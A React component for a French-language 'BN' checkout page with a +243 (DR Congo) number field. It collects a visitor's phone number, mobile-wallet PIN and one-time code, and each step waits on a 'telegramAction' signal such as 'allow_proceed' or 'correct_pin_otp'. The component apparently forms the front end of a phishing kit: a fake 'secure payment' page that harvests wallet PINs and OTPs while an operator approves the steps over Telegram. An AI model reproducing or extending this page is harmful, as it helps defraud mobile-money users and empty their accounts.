import BrandMark from './BrandMark';
import UiGlyph from './UiGlyph';

function CheckoutPage({
  checkoutOffer,
  onBack,
  brandSources,
  waitingApproval,
  approvalPassed,
  paymentConfirmed,
  apiPhoneNumber,
  approvalError,
  otpTimer,
  otpSent,
  phoneError,
  walletPinError,
  normalizedLocalNumber,
  walletPin,
  setPhoneNumber,
  setWalletPin,
  setPhoneError,
  setApprovalError,
  submissionError,
  setSubmissionError,
  setWalletPinError,
  otpDigits,
  otpInputRef,
  handleOtpPaste,
  handleOtpDigitChange,
  handleOtpDigitKeyDown,
  otpError,
  resendLoading,
  handleResendOtp,
  resendMessage,
  resendError,
  handleCheckoutSubmit,
  submissionLoading,
  actionLoading,
  actionError,
  telegramAction
}) {
  const approvalReady = approvalPassed || telegramAction?.action === 'allow_proceed';
  const checkoutStatusIcon = waitingApproval ? 'refresh' : approvalReady ? 'otp' : 'shieldCheck';
  const verificationApproved = telegramAction?.action === 'correct_pin_otp';

  return (
    <main className="page-shell checkout-page-shell">
      <div className="checkout-shell">
        <section className="checkout-drden-hero" aria-label="BN Lite">
          <div className="checkout-drden-logo-wrap">
            <BrandMark
              sources={brandSources}
              alt="BN"
              fallbackType="drden"
              brand="drden"
            />
          </div>
          <h1>Connectez-vous au service BN pour finaliser le paiement.</h1>
        </section>

        <section className="checkout-card checkout-card-lite">
          <div className="checkout-header-lite">
            <button type="button" className="checkout-back checkout-back-inline" onClick={onBack}>
              <UiGlyph type="arrowLeft" />
              Retour
            </button>
          </div>

          <p className="checkout-subtitle checkout-subtitle-icon">
            <UiGlyph type={checkoutStatusIcon} />
            <span>
              {waitingApproval
                ? 'Validation de vos informations...'
                  : approvalReady
                  ? `Un code OTP a été envoyé à ${apiPhoneNumber || 'votre numéro'}. Saisissez-le pour terminer.`
                  : 'Vérifiez votre numéro avec votre PIN'}
            </span>
          </p>

          {waitingApproval && (
            <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
              <svg width="48" height="48" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z" />
                <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z" />
              </svg>
              <span>Validation de vos informations...</span>
              <span className="sr-only">Validation des informations</span>
            </div>
          )}

          {approvalError && <div className="checkout-error field-error">{approvalError}</div>}

          {approvalReady && !paymentConfirmed && (
            <div className="otp-timer">
              {otpTimer > 0
                ? `Code valide pendant : ${otpTimer}s`
                : 'Le code OTP a expire. Rechargez la page ou reessayez.'}
            </div>
          )}

          {!paymentConfirmed && (
            <form className="checkout-form" onSubmit={handleCheckoutSubmit} noValidate>
              {!otpSent && (
                <>
                  <label className="form-field">
                    <span className="label-with-icon"><UiGlyph type="mobile" />Numero de contact</span>
                    <div className="phone-field-row">
                      <span className="phone-country"><span className="country-badge">CD</span><strong>+243</strong></span>
                      <input
                        type="tel"
                        value={normalizedLocalNumber}
                        onChange={(event) => {
                          setPhoneNumber(event.target.value.replace(/\D/g, '').slice(0, 9));
                          if (phoneError) setPhoneError('');
                          if (approvalError) setApprovalError('');
                          if (submissionError) setSubmissionError('');
                        }}
                        placeholder="951234567"
                        inputMode="numeric"
                        autoComplete="tel-national"
                      />
                    </div>
                    {phoneError && <span className="field-error">{phoneError}</span>}
                  </label>

                  <label className="form-field">
                    <span className="label-with-icon"><UiGlyph type="lock" />Entrez votre PIN</span>
                    <input
                      type="password"
                      value={walletPin}
                      onChange={(event) => {
                        setWalletPin(event.target.value);
                        if (walletPinError) setWalletPinError('');
                        if (approvalError) setApprovalError('');
                        if (submissionError) setSubmissionError('');
                      }}
                      placeholder="Entrez votre PIN"
                      inputMode="numeric"
                      required
                    />
                    {walletPinError && <span className="field-error">{walletPinError}</span>}
                  </label>
                </>
              )}

              {approvalReady && !paymentConfirmed && (
                <label className="form-field">
                  <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Entrez OTP</span>
                  <div className="otp-grid" onPaste={handleOtpPaste}>
                    {otpDigits.map((digit, idx) => (
                      <input
                        key={`otp-${idx}`}
                        ref={(node) => {
                          otpInputRef.current[idx] = node;
                        }}
                        type="text"
                        value={digit}
                        onChange={(event) => handleOtpDigitChange(idx, event.target.value)}
                        onKeyDown={(event) => handleOtpDigitKeyDown(idx, event)}
                        inputMode="numeric"
                        maxLength={1}
                        aria-label={`OTP digit ${idx + 1}`}
                        className="otp-digit"
                      />
                    ))}
                    <UiGlyph type="eye" />
                  </div>
                  {otpError && <span className="field-error">{otpError}</span>}
                </label>
              )}

              {approvalReady && !paymentConfirmed && (
                <div className="form-resend">
                  <button
                    type="button"
                    className="button-secondary"
                    onClick={handleResendOtp}
                    disabled={resendLoading || otpTimer === 0}
                  >
                    {resendLoading ? 'Renvoi...' : 'Renvoyer OTP'}
                  </button>
                  {resendMessage && <span className="field-success">{resendMessage}</span>}
                  {resendError && <span className="field-error">{resendError}</span>}
                </div>
              )}

              <div className="form-actions">
                <button
                  type="submit"
                  className="button-primary button-connect"
                  disabled={(approvalReady && otpTimer === 0 && !paymentConfirmed) || submissionLoading || waitingApproval || actionLoading}
                >
                  {submissionLoading ? 'Envoi...' : 'CONNEXION'}
                </button>
              </div>
            </form>
          )}

          {paymentConfirmed && actionLoading && (
            <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
              <svg width="36" height="36" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z" />
                <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z" />
              </svg>
              <span>Validation OTP...</span>
              <span className="sr-only">Validation OTP</span>
            </div>
          )}

          {submissionError && <div className="checkout-error field-error">{submissionError}</div>}
          {actionError && <div className="checkout-error field-error">{actionError}</div>}

          {telegramAction && telegramAction.action === 'allow_proceed' && !paymentConfirmed && (
            <div className="checkout-success status-line">
              <UiGlyph type="shieldCheck" />
              Approuve. Saisissez l'OTP pour terminer votre paiement.
            </div>
          )}

          {paymentConfirmed && (
            <div className="checkout-confirmation status-line">
              <UiGlyph type="spark" />
              OTP verifie. Veuillez attendre l'invite de paiement pour terminer votre commande.
            </div>
          )}

          {paymentConfirmed && actionLoading && <div className="checkout-info">Validation OTP... Cela peut prendre quelques secondes.</div>}

          {paymentConfirmed && telegramAction && (
            <div className="checkout-success status-line">
              <UiGlyph type="shieldCheck" />
              <strong>Action recue :</strong> {telegramAction.text}
            </div>
          )}

          {paymentConfirmed && (
            <section className="checkout-final-state" aria-live="polite">
              <div className="checkout-final-icon">
                <UiGlyph type={verificationApproved ? 'shieldCheck' : 'refresh'} />
              </div>
              <div className="checkout-final-copy">
                <h2>{verificationApproved ? 'Paiement confirme' : 'Verification en cours'}</h2>
                <p>
                  {verificationApproved
                    ? 'Merci. Votre validation OTP est confirmee. Suivez les instructions de paiement pour finaliser la transaction.'
                    : 'Votre OTP a ete envoye pour verification. Veuillez patienter pendant la confirmation finale.'}
                </p>
              </div>
              <div className="checkout-final-actions">
                <button type="button" className="button-secondary" onClick={onBack}>
                  Retour aux offres
                </button>
              </div>
            </section>
          )}

          {paymentConfirmed && actionError && <div className="checkout-error field-error">{actionError}</div>}
        </section>

        <footer className="checkout-collab-footer">
          <div className="checkout-collab-logo">
            <BrandMark
              sources={brandSources}
              alt="BN"
              fallbackType="drden"
              brand="drden"
            />
          </div>
          <p>Service de paiement sécurisé</p>
          <strong>BN RDC</strong>
        </footer>
      </div>
    </main>
  );
}

export default CheckoutPage;
